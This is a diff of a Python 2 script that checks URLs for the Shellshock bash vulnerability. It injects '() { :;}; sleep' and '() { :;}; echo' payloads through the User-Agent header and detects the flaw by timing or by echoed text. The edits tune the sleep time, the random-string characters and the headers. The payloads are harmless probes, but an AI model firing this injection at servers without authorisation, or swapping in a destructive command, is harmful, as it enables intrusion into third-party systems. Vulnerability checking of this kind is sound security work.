@@ -1,12 +1,13 @@
 #!/usr/bin/env python
+# TODO: cgange to request ? way nicer, but no default module...
 import urllib2
 import time
 import random
 import string
 
-randstr = lambda n: ''.join(random.choice(string.printable) for i in xrange(n))
+randstr = lambda n: ''.join(random.choice(string.ascii_letters + string.digits) for i in xrange(n))
 
-def timing_attack(url, request_type="HEAD", data=None, headers=None, sleeptime = 5, cmd="() { :;}; sleep %f"):
+def timing_attack(url, request_type="HEAD", data=None, headers=None, sleeptime = 3, cmd="() { :;}; sleep %f"):
     request_type = request_type.upper()
     if request_type not in ("HEAD", "GET", "POST"):
         raise Exception("Illegal request type '%s'" % request_type)
@@ -35,6 +36,7 @@ def text_attack(url, request_type="GET", data=None, headers=None):
     needle = randstr(20)
     r = urllib2.Request(url, data, headers)
     r.add_unredirected_header("User-Agent", '() { :;}; echo \'%s\'' % (needle,))
+    r.add_header("User-Agent", '() { :;}; echo \'%s\'' % (needle,))
     r.get_method = lambda : request_type
     
     response = urllib2.urlopen(r)
@@ -56,6 +58,7 @@ if __name__ == '__main__':
             print timing_attack(url, "GET")
             print "Known text attack vulnerable:",
             print text_attack(url, "GET")
+            print
             
         except urllib2.HTTPError as he:
             print "Request error:", he
